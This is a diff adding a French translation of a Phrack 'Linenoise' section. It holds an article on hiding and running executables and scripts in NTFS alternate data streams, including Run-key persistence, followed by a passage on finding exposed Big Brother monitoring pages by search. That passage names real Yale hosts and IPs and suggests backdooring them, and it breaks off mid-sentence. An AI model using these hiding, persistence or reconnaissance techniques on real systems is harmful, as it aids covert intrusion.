@@ -1,0 +1,1315 @@
+<html>
+<head>
+<meta http-equiv="Content-Language" content="fr">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+<style>
+<!--
+p
+	{margin-right:0cm;
+	margin-left:0cm;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	color:black}
+ p.MsoNormal
+	{mso-style-parent:"";
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	color:windowtext; margin-left:0cm; margin-right:0cm; margin-top:0cm}
+-->
+</style>
+</head>
+
+<body>
+
+
+<p align="center"><font color="#000000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+==Phrack Inc.==<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Volume 0x0b, Issue 0x3c, Phile #0x03 of 0x10<br>
+&nbsp;</font></p>
+
+<p align="center">|=-----------------------------------------------------=[ L I N E N O I S E 
+]=--------------------------------------------------------=|<br>
+|=--------------------------------------------=[Traduit par Jacob [Degenere-Science]]=-----------------------------------------------=|<br>
+|=--------------------------------------------------------=[ Phrack Staff ]=------------------------------------------------------------=|<br>
+&nbsp;</p>
+
+<p align="left">
+<br>
+--[ Table des matières<br>
+<br>
+&nbsp;<br>
+&nbsp; 1 - Le coté obscure de NTFS<br>
+<br>
+&nbsp; 2 - Analysons Big Brother<br>
+<br>
+&nbsp; 3 - Appels gratuits depuis un mobile<br>
+<br>
+&nbsp; 4 - Lawfully Authorized Electronic Surveillance [LAES]<br>
+<br>
+&nbsp; 5 - Java traverse le firewall !<br>
+<br>
+&nbsp;<br>
+<br>
+--[ 1 - Le coté obscure de NTFS (par H. Carvey)<br>
+<br>
+<b>Introduction</b><br>
+<br>
+Les plates-formes Microsoft continuent à proliférer et à se multiplier. Les 
+serveurs de bureau et de sociétés fonctionnent sous Windows NT (NT) et Windows 
+2000 (2k), contrairement aux systèmes des utilisateurs familiaux et des 
+étudiants qui tournent sous Windows XP (XP). Ces plates-formes sont extrêmement 
+populaires, et très répandues. Cependant, les administrateurs et les 
+utilisateurs de ces systèmes en savent très peu sur un dispositif du système de 
+fichier NTFS appelé &quot; Flux de données alternés &quot;(alternate data streams en V.O 
+,A.D.S)<br>
+<br>
+NTFS est le système de fichier préféré de par sa stabilité, sa fonctionnalité, 
+et le niveau de sécurité qu'il fournit. Les ' flux de données alternés NTFS ' 
+(ADSs) sont fournit pour la compatibilité avec le système de fichier 
+hiérarchique (NDT: initialement &quot; Macintosh Hierarchical File System (HFS) &quot;) de 
+Macintosh, qui utilise les forks(N.D.T :Les fichiers Macintosh sont constitués 
+de deux composantes appelées forks ) ressource pour maintenir une information 
+associé avec un fichier, comme une icône, etc.. (RUSS00). Contrairement a 
+Microsoft qui fournit des moyens pour créer des ADSs spécifique via Windows 
+Explorer, les outils nécessaire et les fonctionnalité pour détecter la présence 
+d'ADSs arbitraires sont absents. Curieusement, les OS ont les fonctionnalité et 
+les outils nécessaires de base pour autoriser un utilisateur a créer des ADSs et 
+pour exécuter du code caché dans ces fluxs. L'article de Microsoft Q101353 
+reconnaît le fait que les API de base Win32 supportent inconsciemment les ADSs.<br>
+<br>
+Le but de cet article est de décrire en détail comment les ADSs sont créé et 
+manipulé, et comment du code caché dans les ADSs peut être exécuté. Les 
+différence spécifique dans le traitement des ADSs par NT, 2K, XP ne seront pas 
+noté.<br>
+<br>
+&nbsp;<br>
+<br>
+<b>Création D'ADSs</b><br>
+<br>
+La syntaxe utilisé pour créer des ADSs est relativement simple. Pour créer un 
+ADS associéavec le fichier &quot; monfichier.txt &quot;, il suffit de séparer le nom par 
+défaut du flux du nom de l'ADS, avec les deux points. <br>
+<br>
+c:\ads&gt;echo Ceci est un ADS &gt; monfichier.txt:hidden<br>
+<br>
+En plus, un ADS peut être créé en utilisant le contenu d'un autre fichier.<br>
+<br>
+c:\ads&gt;echo Ceci est un fichier test &gt; test.txt<br>
+<br>
+c:\ads&gt;type test.txt &gt; monfichier.txt:hidden<br>
+<br>
+Cet ADS peut ensuite être vérifier en utilisant Notepad.<br>
+<br>
+c:\ads&gt;notepad monfichier.txt:hidden<br>
+<br>
+Cependant, aucune des variations de la commande 'dir' ou aucune des 
+configurations de l'explorateur windows ne détecterons la présence de cet nouvel 
+ADS créé.<br>
+<br>
+En plus, des ADSs peuvent êtres créés et associée avec le listing d'un 
+répertoire, plutôt qu'un fichier. Cette particularité prendra plus de 
+signification plus loin dans l'article. Pour le moment, c'est suffisant de 
+décrire comment de tel ADSs peuvent être créé.<br>
+<br>
+c:\ads&gt;echo Cette ADS est associé au listing du répertoire&gt; :hidden<br>
+<br>
+Les ADSs de ce type peuvent être crées avec Notepad et la commande &quot;type&quot;, 
+évidemment.<br>
+<br>
+Le contenu des ADSs peuvent ne pas être limités a du simple texte. Quelques 
+chaînes d'informations binaire peuvent constituer un fichier, et l'ADS n'est 
+rien de plus qu'un fichier. N'importe quel exécutable peut être caché dans les 
+ADSs facilement.<br>
+<br>
+c:\ads&gt;type c:\winnt\notepad.exe &gt; monfichier.txt:np.exe<br>
+<br>
+c:\ads&gt;type c:\winnt\system32\sol.exe &gt; monfichier.txt:sol2.exe <br>
+<br>
+De façon similaire, les fichiers images, audio ou autres chaînes de donné 
+peuvent être cachés dans les ADSs<br>
+<br>
+Finalement, Windows Explorer fournit un moyen par lequel des ADSs très 
+spécifique peuvent être créés (RUSS00). Si l'utilisateur ouvre Explorer et 
+choisi un fichier, et ensuite fait un click droit sur ce fichier, un menu 
+déroulant apparaît. En choisissant &quot;Propriété&quot; <br>
+<br>
+apparaîtra un boite de dialogue des propriétés, et en choisissant l'étiquette &quot; 
+Sommaire&quot; (voir figure 1), cela relaiera les champs dans lesquelles 
+l'utilisateur peut insérer des informations.<br>
+<br>
+<center>
+&nbsp;<img border="0" src="Image1.gif" width="370" height="443"><br>
+<b>Figure 1 : Sommaire de la boite de dialogue &quot; Propriétés &quot; </b>
+<br></center>
+<br>
+&nbsp;<br>
+<br>
+&nbsp; Les ADSs n'ont aucun attribut par défaut, intrinsèquement . Les droits 
+d'accès assignés au flux d'accès sans nom par défaut contrôle l'accès pour créer 
+ou voir les ADSs. Plus simplement, si un utilisateur ne peut pas écrire dans un 
+fichier, cet utilisateur ne peut pas ajouter un ADS à ce même fichier. Alors que 
+la protection des fichiers windows ('Windows File protection') prévient le 
+remplacement des fichiers systèmes protégé, il ne prévient pas un utilisateur 
+avec les permission appropriées qui ajoute des ADSs à ces fichiers systèmes. Le 
+'System File Checker' (sfc.exe) va vérifier que les fichiers systèmes protégé 
+n'ont pas été remplacé, mais ne détectera pas les ADSs.<br>
+<br>
+Les utilisateurs et les administrateurs devraient aussi être au courant de 
+l'article Q319300, qui déclare qu'un serveur d'indexation du contenu Windows 
+2000 ajoute des flux de données alternés nommé &quot;?Q30lsldxJoudresxAssqpcawXc&quot; aux 
+fichiers images sur les volumes NTFS. Ces ADSs contiennent les onglets de ces 
+images.<br>
+<br>
+Détection, affichage et manipulation des ADSs<br>
+<br>
+&nbsp;Comme indiqué précédemment, Microsoft ne fournit pas des outils ou des 
+utilitaires (soit directement avec le système d'exploitation soit dans un kit de 
+ressources) pour détecter la présence des ADSs. Un des meilleurs outils 
+disponibles pour cela se nomme lads.exe, écrit par Frank Heyne. Lads.exe est 
+actuellement disponible sous la version 3.01, et fait un excellent travail de 
+rapport des disponibilité des ADSs. Pour les administrateurs travaillant avec 
+des outils graphique, lads.exe est un outil à interface en ligne de commande qui 
+reporte ce qu'il trouve a l'écran. (c'est à dire sur la sortie standard ou 
+STDOUT). La figure 2 montre un exemple de lads.exe en action, qui fonctionne 
+dans un répertoire de test, c:\ads<br>
+<br><center>
+<img border="0" src="Image2.gif" width="636" height="359"><b><br>
+&nbsp;FIGURE 2:&nbsp; LADS Output pour c:\ads</b><br></center>
+<br>
+&nbsp;<br>
+La figure<font face="Times New Roman"> 2 montre juste comment on peut employer pleinement lads.exe: Il ne 
+rapporte pas seulement la présence d'ADSs, mais il rapporte aussi le chemin 
+complet et la taille pour chaque ADS. Les notes particulières devraient être 
+prises des trois d'ADSs associés avec monfichier.txt. Deux commençant par un 
+caractère ASCII ne ressemblant pas à grand chose, et le troisième est une longue 
+série de nombre et de lettres entre deux armatures bouclées. Çà, ce sont les 
+ADSs qui sont associés avec le fichier utilisant l'onglet &quot;sommaire&quot; de la boite 
+de le dialogue &quot;propriété&quot; (fig. 1)<br>
+<br>
+Lorsque une ADS est détecté, que pouvons nous faire pour voire son contenue ? 
+Notepad est un utilitaires très maniable pour voir des fichiers, et peut être 
+utilisé pour voir le contenue des ADSs. Cependant, il y a un petit problème. Par 
+exemple, la commande suivante produit un résultat inattendu:<br>
+<br>
+c:\ads&gt;notepad monfichier.txt:hidden<br>
+</font>
+<br>
+Lorsque cette commande est exécutée, Notepad s'ouvre et demande si l'utilisateur 
+souhaite créer un nouveau fichier. Ceci est une requête peu commune, parce que 
+l'ADS a été créé plus tôt. Pour observer le résultats prévus, entrer la commande 
+suivante:<br>
+<br>
+c:\ads&gt;echo Ceci est un autre ADS &gt; monfichier.txt:caché.txt<br>
+<br>
+c:\ads&gt;notepad monfichier.txt:caché.txt<br>
+<br>
+Le même effet peut être observé lorsque l'ADS est associé avec le listing d'un 
+répertoire, comme dans &quot;:caché.txt&quot;. L'addition de l'extension à la fin du nom 
+de fichier autorise l'ADS à être ouvert avec Notepad. Ceci va aussi fonctionner 
+pour les autres ADSs, comme:<br>
+<br>
+c:\ads&gt;notepad monfichier.txt:np.exe<br>
+<br>
+Les ADSs sont des fonctionnalités du système de fichier NTFS, ainsi si un 
+fichier avec un fichier avec un ADS est transféré sur un autre système de 
+fichier, comme FAT, FAT32 ou EXT2; l'ADS est alors enlevé, comme ce n'est pas 
+supporté sur ces autres systèmes de fichiers. Les ADSs sont préservés si le flux 
+sans nom par défaut (c'est à dire: monfichier.txt&nbsp; des exemples précédents) 
+est copié ou transféré à travers une partition NTFS, ou sur un lecteur NTFS. 
+Ceci peut être accomplit en utilisant la commande 'copy' ou 'move'.<br>
+<br>
+Enlever tous les ADSs d'un flux par défaut est relativement simple, utilisez les 
+commandes suivantes:<br>
+<br>
+c:\ads&gt;type monfichier.txt &gt; monfichier.bat<br>
+<br>
+c:\ads&gt;del monfichier.txt<br>
+<br>
+c:\ads&gt;ren monfichier.bat monfichier.txt<br>
+<br>
+En utilisant LADS, il est facile de vérifier que tout les ADS créés avec les 
+précédents exemples ont disparu.<br>
+<br>
+<b>Exécuter des ADSs</b><br>
+<br>
+Dans les exemples précédents, les exécutables étaient cachés dans les ADSs. 
+Cette information semble assez inutile à moins que les exécutables eux-mêmes 
+puissent être lancés, sans d'abord devoir les copier hors de l'ADS. En fait, la 
+commande 'start' peut être utilisée pour faire cela. Puisque les exécutables 
+cachés plus tôt ont été supprimés, redémarrez la commande va nous servir 
+d'exemple. Utilisez la commande 'type', cachez Notepad et le Solitaire dans les 
+ADSs associés avec monfichier.txt.<br>
+<br>
+Sur NT, une simple commande va lancer chaque exécutable (MCCL99)<br>
+<br>
+c:\ads&gt;start monfichier.txt:np.exe<br>
+<br>
+c:\ads&gt;start monfichier.txt:sol2.exe<br>
+<br>
+Cependant, ces commandes génèrent une erreur sur Win2k.Si l'on se fie au&nbsp; 
+message d'erreur, il apparaît que <br>
+<br>
+l'information pointée sur l'exécutable n'est pas suffisante. Par conséquent, 
+chaque chemin relatif ou absolu suffit, et démarrer chacune de ces commande va 
+le démontrer:<br>
+<br>
+c:\ads&gt;start c:\ads\monfichier.txt:np.exe<br>
+<br>
+c:\ads&gt;start .\monfichier.txt:np.exe<br>
+<br>
+Un point intéressant a noter est comment le processus apparaît pendant qu'il 
+démarré. Par exemple, démarrer pslist.exe de SysInternals après l'exécution de 
+chacune des deux commandes citées plus haut, affiche un processus appelé 
+&quot;monfichier.txt&quot; fonctionnant avec un PID de 1512, comme montré dans <br>
+la figure 3.<br>
+<br>
+&nbsp;<br>
+<br>
+<br><center>
+<img border="0" src="Image3.gif" width="572" height="239"><br>
+<b>Figure 3: Liste des processus en utilisant pslist.exe</b><br></center>
+<br>
+&nbsp;<br>
+La figure 4 montre les processus dans l'onglet Processus de Gestionnaire des 
+tâches<br>
+<br><center>
+<b><img border="0" src="Image4.gif" width="404" height="447"><br>
+Figure 4: Les processus affiché par gestionnaire des tâches sous Win2k</b><br>
+<br></center>
+Assez curieusement, l'onglet processus sous 2k montre que le PID 1512 a une 
+image du nom de &quot;monfichier.txt&quot;. La figure 5 montre l'onglet Application de 
+Gestionnaire des tâches<br>
+<br><center>
+<img border="0" src="Image5.gif" width="404" height="447"><br>
+<b>Figure 5: L'onglet Applications de gestionnaire des tâches sous 2k</b><br>
+<br></center>
+La figure 6 montre que l'onglet des processus du gestionnaire des tâches sous XP 
+s'affiche lorsque la même commande est exécutée sur le système d'exploitation<br>
+<br><center>
+<img border="0" src="Image6.jpg" width="430" height="455"><br>
+<b>Figure 6: L'onglet Processus de gestionnaire des tâches sous XP</b><br>
+<br></center>
+Finalement, obtenez des informations sur le processus avec listdlls.exe de 
+SysInternals qui va afficher &quot;c:\ads\monfichier.txt:np.exe&quot; comme la ligne de 
+commande pour la commande précédente (voir figure 7), sous XP comme sous 2k.<br>
+<br>
+<br><center>
+<img border="0" src="Image7.gif" width="572" height="347"><br>
+<b>Figure 7: Résultat de listdlls.exe sur 2k</b><br>
+<br></center>
+Une méthode alternative pour lancer des exécutables cachés sous 2k est un 
+raccourci (KASP01). Pour démontrer ce point, créez un raccourci sur le bureau. 
+L'endroit ou le fichier pour ce raccourci est placé est &quot;c:\ads\monfichier.txt&quot;. 
+Lorsque le raccourci a était créer, observez l'icône sur le bureau. Supposez que 
+l'ADS pour le solitaire a été créé. Rendez-vous dans les propriétés du 
+raccourci: l'emplacement auquel se réfère le raccourci est 
+&quot;c:\ads\monfichiers.txt:sol2.exe&quot;. Attendez quelques secondes et observez les 
+changements sur l'icône. Lancez l'exécutable en double cliquant sur cette icône.<br>
+<br>
+Assez intéressant, une technique similaire fonctionne pour ajouter une entrée 
+dans le dossier démarrer de windows&quot; (KASP01) ou dans le dossier 'run' dans le 
+registre (KASP01). Le chemin complet pour cette clé est:<br>
+<br>
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>
+<br>
+Spécifiez le chemin complet pour l'exécutable caché va garantir le lancement de 
+celui ci chaque fois que le système sera démarré.<br>
+<br>
+Maintenant une autre méthode pour lancer un exécutable caché dans les ADSs se 
+fait via la box &quot;démarrage&quot; dans le menue démarrer (KASP01). Cliquez sur le 
+bouton démarrer, ensuite &quot;démarrage&quot;, et tapez les commande suivante ce qui aura 
+pour effet de lancer le solitaire ADS:<br>
+<br>
+file:///c:/ads/monfichier.txt:sol2.exe<br>
+<br>
+Pour les administrateur utilisant <a href="http://www.activestate.com/">Perl</a>: 
+Le perl interprète les ADSs assez facilement. Par exemple, les lignes suivantes 
+d'un code Perl peuvent être utilisées pour lancer un ADS:<br>
+<br>
+my $file = 'c:\ads\monfichier.txt:sol2.exe';<br>
+<br>
+`$file`; <br>
+<br>
+Sauvegardez le code précédant dans 'ads.pl' et exécutez le code en tapant:<br>
+<br>
+c:\perl&gt;ads.pl<br>
+<br>
+Il y a une variation intéressante, ainsi la commande suivante fonctionne:<br>
+<br>
+c:\perl&gt;type ads.pl &gt; monfichier.txt:ads.pl<br>
+<br>
+c:\perl&gt;perl monfichier.txt:ads.pl<br>
+<br>
+&nbsp;The Windows Scripting Host (WSH) a été lancé avec 2k et présente beaucoup 
+de possibilité intéressante en rapport avec les ADSs (KASP01). C'est 
+particulièrement important parce que WSH est natif dans les distribution 2k et 
+XP, alors que Perl doit être installé séparément. Pour démontrer cette capacité 
+de WSH, tapez la commande suivante:<br>
+<br>
+c:\ads&gt;echo MsgBox &quot;VBS file to test ADSs&quot; &gt; ads.vbs<br>
+<br>
+Pour exécuter ce script utilisez WSH; tapez:<br>
+<br>
+c:\ads&gt;wscript ads.vbs<br>
+<br>
+Alternativement, tapez:<br>
+<br>
+c:\ads&gt;cscript ads.vbs<br>
+<br>
+Ou simplement, double cliquez sur le fichier dans l'explorateur windows. Ces 
+trois méthodes vont fonctionner avec les code VBScript. Maintenant tapez les 
+commandes suivantes:<br>
+<br>
+c:\ads&gt;wscript monfichier.txt:ads.vbs<br>
+<br>
+Ou:<br>
+<br>
+c:\ads&gt;start .\monfichier.txt:ads.vbs<br>
+<br>
+Cscript.exe démarre aussi le script. Alternativement, les méthode mentionnées 
+&quot;raccourcit&quot; et box &quot;démarrer&quot; auparavant démarrent le script également 
+(KASP01).<br>
+<br>
+<b>Le vrai, vrai coté obscure</b><br>
+<br>
+Si le script caché dans un ADS finit avec une extension différente (c'est à dire 
+autre que &quot;.vbs&quot;), WHS aura du mal a reconnaître ce type de fichier, et va se 
+plaindre que quelque chose pour exécuter le fichier n'est pas présent. Par 
+exemple:<br>
+<br>
+c:\ads&gt;type ads.vbs &gt; monfichier.txt:ads.txt<br>
+<br>
+c:\ads&gt;wscript monfichier.txt:ads.txt<br>
+<br>
+L'exécution de la seconde commande va faire une erreur. Cependant, wscript.exe 
+comme cscript.exe permettent a l'administrateur de contrôler l'exécution du 
+programme. La syntaxe de commande peut être vu en tapant:<br>
+<br>
+c:\ads&gt;wscript /?<br>
+<br>
+L'option &quot;//E&quot; autorise l'utilisateur a spécifier un moteur a être utilisé. La 
+nouvelle commande sera:<br>
+<br>
+c:\ads&gt;wscript //E:vbs monfichier.txt:ads.txt<br>
+<br>
+Ceci présente quelques moyens intéressants pour une utilisation malveillante. 
+Par exemple, le dernier exemple d'ADSs produit via Windows Explorer (c'est à 
+dire via l'onglet sommaire dans la boite de dialogue &quot;Propriétés&quot; pour un 
+fichier) produit un ADS avec le nom &quot;?SummaryInformation&quot;. Le code, comme un 
+script VBScript, peut être créé et écrit pour un ADS avec le même nom, et 
+ensuite lancé. Le code Perl suivant illustre bien ceci:<br>
+<br>
+my $file = &quot;c:\\ads\\monfichier.txt:&quot;.chr(5).&quot;SummaryInformation&quot;;<br>
+<br>
+my $src = 'c:\ads\ads.vbs';<br>
+<br>
+`type $src &gt; $file`;<br>
+<br>
+`wscript //E:vbs $file`;<br>
+<br>
+La dernière commande dans le script est intéressante. Pour wscript.exe et 
+cscript.exe, l'option &quot;//E&quot; force l'application à utiliser un moteur de script 
+particulier. Dans ce cas, l'ADS&nbsp; contenat le script à être lancé n'as pas 
+d'extension, ainsi le scripting host n'a aucun moyen<br>
+<br>
+&nbsp;de déterminer le moteur de script a être utilisé. Cette exemple pourrait 
+être aussi appliqué aussi facilement aux ADSs créés par le &quot;Content Indexing 
+Server&quot;, comme mentionné précédemment.<br>
+<br>
+<b>Conclusion</b><br>
+<br>
+Les ADSs sont un dispositif du système de fichier NTFS créées pour fournir une 
+compatibilité avec HFS, ce qui pourrait encore être nécessaire pour la 
+compatibilité. Cependant, le manque de visibilité de ce &quot;dispositif&quot; pose un 
+risque pour les administrateurs. Il y a déja eu un virus qui employait les ADSs, 
+W2K. Stream écrit par Bennie et Ratter du group 29A (KASP01). Comme la le nombre 
+d'attaques et d'incidents cybercriminels augmente, l'utilisation malicieuse des 
+ADSs va également augmenter.<br>
+<br>
+La solution n'est pas de stopper l'utilisation du système de fichier NTFS, les 
+bénéfice en sécurité et à l'utilisation sont fabuleux. Ce &quot;dispositif&quot; est resté 
+partie intégrante du système de fichier depuis NT 3.1. Etant donné les 
+circonstances, une solution bien plus prudente aurait été d'inclure le support 
+des fichiers HFS dans le service de fichiers et d'impression pour Macintosh, 
+plutôt que le système de fichier. Ainsi, les administrateurs devraient faire une 
+utilisation judicieuse des &quot;discretionary access control lists (DACLs) sur les 
+fichiers et répertoires (CARV00), et régulièrement scanner leur systèmes 
+critiques en utilisant&nbsp; des utilitaires comme lads.exe. En complément, 
+Microsoft devrait être apte à détecter et voir les ADSs via Windows Explorer et 
+l'interpréteur de commandes. Une autre mesure appropriée serait de faire 
+apparaître les ADSs dans Windows Explorer par défaut. Par exemple, en utilisant 
+une icône avec un signe &quot;A&quot; signifiant &quot;ADS&quot;. En plus, Microsoft devrait fournir 
+des restrictions dans le système d'exploitation pour créer des processus de 
+fichiers exécutables dont les noms contiennent une colonne.<br>
+<br>
+De plus, les vendeurs de logiciels antiviraux devraient inclure le support pour 
+les ADSs dans leur produit, et ceci par défaut. Tandis que beaucoup de vers dans 
+les années passées ou d'autre exécutables, on été écrits en Visual Basic ou en 
+Delphi, d'autres on été fait en Visual Basic scripts. Ce langage à déjà été 
+utilisé pour écrire des malwares entraînants des ravages considérable, et toute 
+les mesures prudentes devraient êtres prises pour protéger les systèmes..<br>
+<br>
+<b>Références</b><br>
+<br>
+RUSS00 Russinovich, M., Inside Win2K NTFS, Part 2 , Windows 2000 Magazine, 
+Novembre, 2000<br>
+<br>
+MCCL99 McClure, S., Scambray, J., and Kurtz, G., Hacking Exposed: Network 
+Security Secrets and Solutions, Berkeley: Osbourne, 1999<br>
+<br>
+KASP01 Kaspersky, E. and Zenkin, D., NTFS Alternate Data Streams , Windows and 
+.Net Magazine, Spring 2001<br>
+<br>
+CARV00 Carvey, H., Network Trojans: What You REALLY Need To Know , Information 
+Security Bulletin, Vol. 5, Issue 8<br>
+<br>
+&nbsp;<br>
+<br>
+--[ 2 - Analysons Big Brother<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; par da_knight 
+&lt;x667576616a6e@yahoo.com&gt;<br>
+<br>
+<br>
+&nbsp;&nbsp;&nbsp; Avez-vous déjà voulu être celui qui espionnait? Si vous êtes 
+un&nbsp;
+administrateur système de serveurs UNIX/Linux, il est possible que vous
+soyez au courant d'un produit appelé Big Brother, qui peut être téléchargé
+sur'http://bb4.com'.Cet article n'est pas orienté technique, simplement
+parce qu'il n'a pas besoin de l'être. Ce dernier est divisé en deux sections,donc soutenez moi pour le briefing sur Big Brother (BB).<br>
+<br>
+&nbsp;&nbsp;&nbsp; BB est un programme qui va afficher les divers équipements 
+d'un
+ordinateur, comme les moniteurs connectés, l'utilisation du cpu, l'usage du <br>
+disque, le statut ftp, le statut http, le statut pop3, etc.. Comme vous
+pouvez l'imaginer, cette information est très importante pour une organisation.
+BB est votre installation standard client/serveur. Le logiciel serveur peu
+fonctionner sous différents UNIX, linux et NT. Le logiciel client est <br>
+disponible pour UNIX, Linux, NT, Novell, AS/400, et VAXEN, et quelques
+logiciels clients sont fournis par des vendeurs 3rd-party et ne sont pas
+supportés par la technologie BB4.<br>
+<br>
+&nbsp;&nbsp;&nbsp; Ce qui est cool avec tout çà c'est que toutes ces 
+informations sont
+visibles sur une page web. Donc, si vous avez des serveurs multiples que <br>
+vous avez à maintenir, avec ce produit vous serez capable d'aller sur une
+page web et rapidement visionner un statut de tout ces serveurs. - joliment <br>
+maniable. Quand tout est OK votre statut est &quot; vert &quot;, les gros problèmes
+sont indiqués en &quot; rouge &quot;.<br>
+<br>
+&nbsp;&nbsp;&nbsp; Exemple : Le statut de connectivité (conn) est donné en 
+pingant
+l'équipement en question, si le ping ne fonctionne pas, il apparaîtra une <br>
+zone rouge sur la page web. Lorsque les tests repèrent ce dysfonctionnement,
+BB peut être configuré pour automatiquement avertir l'administrateur<br>
+(N.D.T:par mail ou autre).<br>
+<br>
+Ici se trouve un menu reprenant les statut, listés selon la sévérité :<br>
+<br>
+rouge&nbsp; - Ennuis; vous avez des problèmes<br>
+violet - Pas de rapport; le client n'as pas répondu dans les dernières<br>
+30 minutes.<br>
+jaune&nbsp; - Attention; un seuil a été franchit.<br>
+vert&nbsp;&nbsp; - OK; tout va bien.<br>
+rien&nbsp;&nbsp; - Non disponible; Le test a été éteint.<br>
+bleu&nbsp;&nbsp; - Désactivé; la notification pour ce test a été désactivée.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Le statut est aussi reflété dans le titre de la page 
+web, ainsi il
+prend seulement une zone rouge pour faire commencer le titre de page Web
+par &quot;red:Bigs Brother&quot;; nous allons nous plonger dans cela dans une minute. <br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Une chose courante que font les administrateurs est de 
+monitorer leurs
+systèmes les plus importants avec ce produit, aussi bien que les aspects <br>
+le plus importants de leurs systèmes. Si vous avez un serveur web, vous
+voudrez peut être monitorer le statut de connexion et http, juste pour <br>
+être sur que les personnes sont bien apte à se connecter au serveur.
+Les autres tests que j'ai pu voir étaient pour vérifier Oracle, ou pour <br>
+lister tous les utiliasteurs connectés. Diable, ils ont même une manière
+d'ajouter des rapports sur la météo. Le point à noter c'est que Vous <br>
+pouvez surveillez pratiquement sans limite, le point important, cela
+dépend juste de ce que vous considérez important. <br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Maintenant que vous avez un peu plus de connaissances 
+sur ce que BB
+est capable de faire, je veux citer deux choses de la FAQ de BB4 Technologies<br>
+&nbsp;(BB4) - Section 5:
+Security Consideration (http://bb4.com/bb/help/bb-faq.html#5.0).<br>
+Tout dans cette section de la FAQ devrait être considéré, mais focalisons-nous
+sur ces deux-là.<br>
+&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp; &quot;BB n'as pas besoin d'être lancé en tant que root. Nous 
+vous suggérons
+de créer un utilisateur 'BB' et de lancer bb avec cet utilisateur&quot;. &quot; Nous <br>
+vous recommandons la protection par mot de passe pour les pages web de
+Big Brother.&quot;<br>
+&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Donc, vous devez vous demandez pourquoi ces deux choses 
+sont importantes
+pour moi ? Bien, un, vous savez que les administrateurs qui lancent ce
+logiciel l'ont probablement installé en utilisant l'utilisateur 'bb', et
+qu'il peut aussi être démarré avec les privilèges root. Cela vous donne
+un compte valide d'utilisateur sur un système, et ce compte n'est probablement
+pas utilisé par une personne très qualifiée donc le mot de passe peut être
+très simple. Mais ce n'est pas le sujet de cet article. La seconde chose,
+c'est que les informations récoltées par BB4 et placées sur ces pages web
+sont extrêmement importantes, et elles recommandent la protection par mot
+de passe. Suivant cette logique vous allez me dire que ces pages webs,&nbsp;
+fonctionnent sur un serveur web, et si elles ne sont pas protégées par mot
+de passe, et si le serveur est visible sur le www....ensuite.... Oui, les
+moteurs de recherches vont trouver ces pages et vous les montrer lorsque
+vous savez ce que vous cherchez. <br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Qu'attendez vous ? rendez vous sur 
+'http://www.google.com' et cherchez
+avec les mots clés &quot;green:Big Brother&quot; (en incluant les &quot;, qui peuvent <br>
+affiner la recherche).Vous allez avoir environ 16,200 réponses. Maintenant
+cela ne signifie pas qu'elles sont toutes uniques: En effet, il y aura des <br>
+numéros de pages provenant du même site, mais vous obtenez la principale.
+J'estimerais qu'il y a environ 200 sites qui peuvent être repérés par <br>
+cette astuce. Essayez de chercher avec tous les autres statut, vous n'avez qu'a
+changer le nom de la couleur. Une autre chose: Je choisis google pour une
+bonne raison: Beaucoup de ces sites ne fonctionnent plus avec les produit
+BB, mais google possède une belle capacité à voir les pages cachées, ainsi
+vous pouvez encore glaner de celles-ci quelques informations. Apres que
+vous ayez trouvé votre liste de sites, vous réalisez que la majorité d'<br>
+entre eux sont soit de petits ISP ou des universités. Je vais choisir
+une université une de Ivy League one, pas moins. Je peux vous dire que <br>
+ce site BB en particulier fonctionne sur un serveur BB du nom de artemis.cs.yale.edu' et l'adresse IP est '128.36.232.57'. L'ordinateur <br>
+'rhino.zoo.cs.yale.edu' a également quelques problèmes sérieux. Comment
+j'ai fait pour trouver l'adresse IP ? Simple. Si vous cliquer sur le <br>
+bouton &quot;green&quot;&nbsp; (vert) ou sur un bouton d'une autre couleur sous la colonne
+&quot;conn&quot;, vous allez voir une page web qui a une information similaire à çà: <br>
+---------------------------------------------------------<br>
+<br>
+rhino.zoo.cs.yale.edu - conn<br>
+<br>
+---------------------------------------------------------<br>
+&nbsp;<br>
+green Sun Jun 30 01:33:15 EDT 2002 Connection OK&nbsp; PING 128.36.232.12<br>
+(128.36.232.12) from 128.36.232.57 : 56(84) bytes of data. 64 bytes<br>
+from 128.36.232.12: icmp_seq=0 ttl=255 time=379 usec<br>
+<br>
+--- 128.36.232.12 ping statistics ---<br>
+1 packets transmitted, 1 packets received, 0% packet loss round-trip<br>
+min/avg/max/mdev = 0.379/0.379/0.379/0.000 ms<br>
+<br>
+---------------------------------------------------------<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Ok vous savez que la commande ping a essayé de pinger 
+'128.36.232.12'
+dans ce cas 'rhino.zoo.cs.yale' provient de '128.36.232.57' ou de <br>
+'artemis.cs.yale.edu'. Voyons ce que nous pouvons trouver.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Je peux voir que presque tout leurs serveurs font 
+tourner Tripwire,
+donc ils ont des systèmes UNIX, et vous allez probablement vouloir créer <br>
+une backdoor sur ce système. Sur une autre page, nous pouvons voir les
+utilisateurs qui sont loggués actuellement. Actuellement, nous avons 33 <br>
+utilisateurs loggués, et nous voyons cela a 1h33 du mat !, ainsi on peut
+penser que certaines personnes ont laisse leur ordinateur loggué.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Je veux obtenir plus d'informations sur les serveurs 
+Yale, ainsi
+allons sur google et faisons une recherche pour un autre page de Yale,
+mais cette fois regardons pour 'zelda.cs.yale.edu'. Maintenant nous pouvons
+obtenir de bonnes informations. Lorsque ce site est affiché, vous allez <br>
+voir quelques serveurs, énumérés comme plusieurs départements. Si vous
+souhaitez savoir quel logiciel 'plucky.cs.yale.edu' utilise pour faire
